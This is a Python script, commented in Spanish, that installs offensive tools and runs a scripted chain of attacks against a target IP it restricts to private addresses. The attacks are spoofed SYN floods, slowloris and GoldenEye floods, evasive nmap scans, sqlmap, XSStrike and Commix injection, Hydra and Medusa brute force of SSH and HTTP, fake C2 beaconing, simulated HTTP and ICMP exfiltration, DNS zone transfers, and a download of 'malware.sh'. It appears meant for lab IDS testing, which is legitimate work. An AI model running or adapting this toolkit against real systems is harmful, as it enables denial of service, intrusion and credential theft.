#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse, os, sys, time, random, subprocess, shlex, shutil
import ipaddress
from concurrent.futures import ThreadPoolExecutor
from typing import Optional, List, Set

# Normaliza PATH para detectar binarios en sbin cuando se ejecuta como usuario
for _p in ("/usr/local/sbin", "/usr/sbin", "/sbin"):
    cur = os.environ.get("PATH", "")
    if _p not in cur:
        os.environ["PATH"] = (cur + (":" if cur else "") + _p)

# ---------- utilidades ----------

AptPkgs = [
    "nmap", "hping3", "slowhttptest", "nikto", "sqlmap",
    "hydra", "medusa", "dnsutils", "curl", "python3-pip", "git", "wget"
]
# metasploit-framework en Debian puede estar antiguo o no presente; lo tratamos como opcional
AptPkgsOptional = ["metasploit-framework"]

# pip para algunas herramientas que no siempre están bien en apt
PipPkgs = [
    "xsstrike",     # xsstrike
    "commix",       # commix
    "dnsrecon",     # dnsrecon
    "goldeneye"     # puede fallar; si no, lo saltaremos
]

# Ejecutables que comprobaremos antes de usar
Bins = [
    "nmap","hping3","slowhttptest","nikto","sqlmap","hydra","medusa",
    "dig","curl","dnsrecon","xsstrike","commix","goldeneye","msfconsole","wget"
]

# Mapeo de binario -> fuente de instalación
TOOL_SOURCES = {
    "nmap": ("apt", "nmap"),
    "hping3": ("apt", "hping3"),
    "slowhttptest": ("apt", "slowhttptest"),
    "nikto": ("apt", "nikto"),
    "sqlmap": ("apt", "sqlmap"),
    "hydra": ("apt", "hydra"),
    "medusa": ("apt", "medusa"),
    "dig": ("apt", "dnsutils"),
    "curl": ("apt", "curl"),
    "wget": ("apt", "wget"),
    "dnsrecon": ("pip", "dnsrecon"),
    "xsstrike": ("pip", "xsstrike"),
    "commix": ("pip", "commix"),
    "goldeneye": ("pip", "goldeneye"),
    "msfconsole": ("apt", "metasploit-framework"),
}

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "curl/8.0.1",
    "Wget/1.21.3"
]

# Registro global de omisiones por falta de binarios
_SKIPPED: Set[str] = set()


def is_root() -> bool:
    return os.geteuid() == 0 if hasattr(os, "geteuid") else False


def have_sudo() -> bool:
    return shutil.which("sudo") is not None


def which(cmd: str) -> Optional[str]:
    """Busca binarios también en sbin/bin estándar y ~/.local/bin."""
    p = shutil.which(cmd)
    if p:
        return p
    search_dirs = (
        "/usr/local/sbin", "/usr/sbin", "/sbin",
        "/usr/local/bin", "/usr/bin", "/bin",
        os.path.expanduser("~/.local/bin"),
    )
    for d in search_dirs:
        cand = os.path.join(d, cmd)
        if os.path.exists(cand) and os.access(cand, os.X_OK):
            return cand
    return None


def have(cmd: str) -> bool:
    return which(cmd) is not None


def skip(tool: str, desc: str) -> None:
    _SKIPPED.add(tool)
    print(f"\033[33m⏭ No ejecutado: {desc} (faltante: '{tool}')\033[0m")


def run(cmd: str, desc: str, timeout=60, dry=False) -> int:
    print(f"\n\033[1;31m▶ {desc}\033[0m")
    print(f"\033[90m$ {cmd}\033[0m")
    if dry:
        return 0
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        out = (r.stdout or r.stderr or "").strip()
        if out:
            print("\033[36m" + out[:2000] + ("\n...truncado..." if len(out) > 2000 else "") + "\033[0m")
        return r.returncode
    except subprocess.TimeoutExpired:
        print("\033[33m⌛ timeout\033[0m")
        return 124
    except Exception as e:
        print(f"\033[31m❌ {e}\033[0m")
        return 1


def ensure_wordlists():
    if not os.path.exists("users.txt"):
        open("users.txt","w").write("admin\nuser\ntest\nroot\n")
    if not os.path.exists("passwords.txt"):
        open("passwords.txt","w").write("admin\n123456\npassword\nP@ssw0rd\n")


def assert_private_ip(ip: str):
    try:
        addr = ipaddress.ip_address(ip)
        if not (addr.is_private or addr.is_loopback):
            print("❌ La IP objetivo no es privada. Este script es solo para laboratorio.")
            sys.exit(2)
    except ValueError:
        print("❌ IP inválida.")
        sys.exit(2)


def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"


def need(cmd: str) -> bool:
    return which(cmd) is None

# Informe rápido de binarios faltantes

def report_missing_tools():
    missing = [b for b in Bins if not have(b)]
    if missing:
        print("\n\033[33mFaltan herramientas:\033[0m " + ", ".join(missing))
        print("Sugerencia: use --auto-install --assume-yes o ejecute primero --install")

# ---------- instalador ----------

def apt_install_batch(pkgs: List[str], assume_yes: bool, dry: bool) -> None:
    if not pkgs:
        return
    prefix = ""
    if not is_root():
        if have_sudo():
            prefix = "sudo "
        else:
            print("⚠ No eres root y no hay 'sudo'. No puedo instalar con apt.")
            return
    y = "-y" if assume_yes else ""
    run(prefix + "apt-get update -y", "apt update", timeout=300, dry=dry)
    run(prefix + f"DEBIAN_FRONTEND=noninteractive apt-get install {y} " + " ".join(pkgs),
        f"apt install {' '.join(pkgs)}", timeout=1200, dry=dry)


def pip_install_batch(pkgs: List[str], user_install: bool, dry: bool) -> None:
    if not pkgs:
        return
    py = shutil.which("pip3") or shutil.which("pip")
    if not py:
        run("python3 -m ensurepip --upgrade || true", "ensurepip", dry=dry)
        py = shutil.which("pip3") or shutil.which("pip")
    if not py:
        print("⚠ No hay pip. Instala python3-pip.")
        return
    flags = "--user" if user_install and not is_root() else ""
    run(f"{py} install {flags} " + " ".join(pkgs), f"pip install {' '.join(pkgs)}", timeout=1200, dry=dry)
    # Aviso PATH
    if user_install and not is_root():
        home_bin = os.path.expanduser("~/.local/bin")
        if home_bin not in os.environ.get("PATH", ""):
            print(f"ℹ Añade {home_bin} al PATH: echo 'export PATH=\"{home_bin}:$PATH\"' >> ~/.bashrc && source ~/.bashrc")


def auto_install_missing(tools: List[str], assume_yes: bool, dry: bool) -> None:
    missing_apt, missing_pip, missing_opt = [], [], []
    for t in tools:
        if have(t):
            continue
        src = TOOL_SOURCES.get(t)
        if not src:
            print(f"⚠ Sin fuente conocida para '{t}', no se instala automáticamente.")
            continue
        kind, pkg = src
        if kind == "apt":
            # metasploit es opcional; lo tratamos aparte
            if pkg == "metasploit-framework":
                missing_opt.append(pkg)
            else:
                if pkg not in missing_apt:
                    missing_apt.append(pkg)
        elif kind == "pip":
            if pkg not in missing_pip:
                missing_pip.append(pkg)

    if missing_apt:
        apt_install_batch(missing_apt, assume_yes=assume_yes, dry=dry)
    if missing_pip:
        pip_install_batch(missing_pip, user_install=True, dry=dry)
    if missing_opt:
        print("ℹ Paquetes opcionales no críticos:", ", ".join(missing_opt))

# ---------- ataques ----------

def simulate_ddos(target_ip: str, duration: int, dry: bool):
    print(f"\n\033[1;31m🔥 DDoS simulado {duration}s\033[0m")
    jobs = []
    if have("hping3"):
        jobs.append(f"hping3 --flood --rand-source -p 80 -S {shlex.quote(target_ip)}")
    else:
        skip("hping3", "SYN flood con hping3")
    if have("slowhttptest"):
        jobs.append(f"slowhttptest -c 800 -H -i 10 -r 150 -u http://{shlex.quote(target_ip)} -x 24 -p 3")
    else:
        skip("slowhttptest", "Slowloris HTTP")
    if have("goldeneye"):
        jobs.append(f"goldeneye {shlex.quote(target_ip)} -s 400 -m random")
    else:
        skip("goldeneye", "GoldenEye HTTP flood")

    if not jobs:
        print("⚠ No hay herramientas de DDoS instaladas. Saltando.")
        return
    end = time.time() + duration

    def loop(cmd):
        while time.time() < end:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if dry:
        for cmd in jobs:
            print("DRY:", cmd)
        return

    with ThreadPoolExecutor(max_workers=len(jobs)) as ex:
        for cmd in jobs:
            ex.submit(loop, cmd)
    print("\033[32m🛑 DDoS finalizado\033[0m")


def simulate_attacks(target_ip: str, ddos_seconds: int, dry: bool):
    ua = random.choice(UA_LIST)
    ensure_wordlists()

    attacks = []

    # Recon avanzada
    if have("nmap"):
        attacks += [
            (f"nmap -sV -T4 -A -D {random_ip()},{random_ip()},ME -f {target_ip}", "Nmap evasivo (OS+Version)"),
            (f"nmap -sS -T2 -f --data-length 24 --badsum {target_ip}", "Nmap SYN con badsum"),
        ]
    else:
        skip("nmap", "Escaneos Nmap avanzados")

    # Web vulns
    if have("nikto"):
        attacks.append((f"nikto -h {target_ip} -Tuning x567", "Nikto web vulns"))
    else:
        skip("nikto", "Escaneo de vulnerabilidades web (Nikto)")

    if have("sqlmap"):
        attacks.append(("sqlmap -u \"http://{}/search.php?q=test\" --batch --random-agent".format(target_ip), "SQLi sqlmap"))
    else:
        skip("sqlmap", "Inyección SQL (sqlmap)")

    if have("xsstrike"):
        attacks.append(("xsstrike -u \"http://{}/search?q=test\" --crawl".format(target_ip), "XSS XSStrike"))
    else:
        skip("xsstrike", "Ataque XSS (XSStrike)")

    if have("commix"):
        attacks.append(("commix --url=\"http://{}/ping.php?addr=127.0.0.1\" --batch".format(target_ip), "OS command inject Commix"))
    else:
        skip("commix", "Inyección de comandos (Commix)")

    # Fuerza bruta
    if have("hydra"):
        attacks.append((f"hydra -L users.txt -P passwords.txt {target_ip} ssh -t 4 -V -f -I -W 3", "Hydra SSH"))
    else:
        skip("hydra", "Fuerza bruta SSH (Hydra)")

    if have("medusa"):
        attacks.append((f"medusa -h {target_ip} -U users.txt -P passwords.txt -M http -m DIR:/admin", "Medusa HTTP auth"))
    else:
        skip("medusa", "Fuerza bruta HTTP (Medusa)")

    # C2 / Beaconing / Evasión
    attacks += [
        ("curl -A {} -H 'X-Forwarded-For: {}' http://{}/c2.php?data=test".format(shlex.quote(ua), random_ip(), target_ip), "Curl C2 headers falsos"),
        ("for i in $(seq 1 10); do curl -s http://{}/beacon_$(date +%s) >/dev/null; sleep 0.5; done".format(target_ip), "Beaconing HTTP"),
    ]

    if have("hping3"):
        attacks.append((f"hping3 -c 600 -d 120 -S -w 64 -p 80 --rand-source {target_ip}", "SYN flood variado"))
    else:
        skip("hping3", "SYN flood variado")

    # Exfil (simulada, evita leer /etc/passwd real)
    attacks += [
        (f"echo 'sample secret' > /tmp/sample.txt && curl -X POST -F 'f=@/tmp/sample.txt' http://{target_ip}/upload.php", "Exfil HTTP simulada"),
        (f"ping -c 5 -p 48656c6c6f {target_ip}", "Exfil ICMP (hex 'Hello')"),
    ]

    # DNS
    if have("dig"):
        attacks.append((f"dig @{target_ip} AXFR example.com", "DNS AXFR dig"))
    else:
        skip("dig", "Intento de transferencia de zona (dig)")

    if have("dnsrecon"):
        attacks.append((f"dnsrecon -d example.com -n {target_ip} -t axfr", "DNSRecon AXFR"))
    else:
        skip("dnsrecon", "Reconocimiento DNS (dnsrecon)")

    # Metasploit (si está)
    if have("msfconsole"):
        msf_cmd = f"msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS {target_ip}; run; exit'"
        attacks.append((msf_cmd, "Metasploit portscan"))
    else:
        skip("msfconsole", "Portscan con Metasploit")

    # Descarga “malware” dummy
    attacks.append((f"wget -q http://{target_ip}/malware.sh -O /tmp/update.sh || curl -s -o /tmp/update.sh http://{target_ip}/malware.sh", "Descarga script"))

    # Ejecutar secuencial con pequeñas pausas
    for cmd, desc in attacks:
        run(cmd, desc, timeout=90, dry=dry)
        time.sleep(random.uniform(0.5, 2.0))

    # DDoS en paralelo al final
    simulate_ddos(target_ip, ddos_seconds, dry)

# ---------- main ----------

def main():
    parser = argparse.ArgumentParser(description="Simulación avanzada de ataques en LAB privado")
    parser.add_argument("--install", action="store_true", help="Instalar dependencias (apt y pip)")
    parser.add_argument("--target", help="IP objetivo (solo privadas RFC1918)")
    parser.add_argument("--ddos-seconds", type=int, default=15, help="Duración del DDoS simulado")
    parser.add_argument("--dry-run", action="store_true", help="Solo mostrar comandos sin ejecutar")
    parser.add_argument("--auto-install", action="store_true", help="Instalar automáticamente las herramientas faltantes antes de atacar")
    parser.add_argument("--assume-yes", action="store_true", help="No preguntar en apt (-y)")
    args = parser.parse_args()

    if args.install:
        # Instalación proactiva
        base = [p for p in AptPkgs if need(p.split()[0])] + [p for p in AptPkgsOptional if need(p.split()[0])]
        if base:
            apt_install_batch(base, assume_yes=True, dry=False)
        pip_needed = [p for p in PipPkgs if need(p.split()[0])]
        if pip_needed:
            pip_install_batch(pip_needed, user_install=True, dry=False)
        print("\n\033[32m✔ Instalación finalizada. Verificación:\033[0m")
        for b in Bins:
            print(f" - {b}: {'OK' if which(b) else 'NO'}")
        return 0

    if not args.target:
        print("Uso: --target 192.168.x.x  (o --install para instalar herramientas)")
        return 2

    # Solo IPs privadas
    try:
        addr = ipaddress.ip_address(args.target)
        if not (addr.is_private or addr.is_loopback):
            print("❌ La IP objetivo no es privada. Este script es solo para laboratorio.")
            return 2
    except ValueError:
        print("❌ IP inválida.")
        return 2

    # Mostrar estado actual de herramientas
    report_missing_tools()

    # Instalar faltantes on-demand
    if args.auto_install:
        need_list = [b for b in Bins if need(b)]
        if need_list:
            print("\n\033[34mIntentando instalar faltantes:\033[0m", ", ".join(need_list))
            auto_install_missing(need_list, assume_yes=args.assume_yes, dry=args.dry_run)
            # Revalidar
            still_missing = [b for b in need_list if need(b)]
            if still_missing:
                print("\n\033[33mAún faltan tras instalación:\033[0m", ", ".join(still_missing))
        else:
            print("\n\033[32mTodas las herramientas necesarias están presentes.\033[0m")

    if have("hping3") and not is_root():
        print("⚠ hping3 requiere root. Ejecuta con sudo para habilitar DDoS/SYN flood.")

    simulate_attacks(args.target, args.ddos_seconds, args.dry_run)

    if _SKIPPED:
        print("\n\033[33mResumen: herramientas no ejecutadas por no estar instaladas:\033[0m")
        for t in sorted(_SKIPPED):
            print(f" - {t}")

    print("\n\033[1;42m✅ SIMULACIÓN COMPLETADA\033[0m")
    return 0

if __name__ == "__main__":
    sys.exit(main())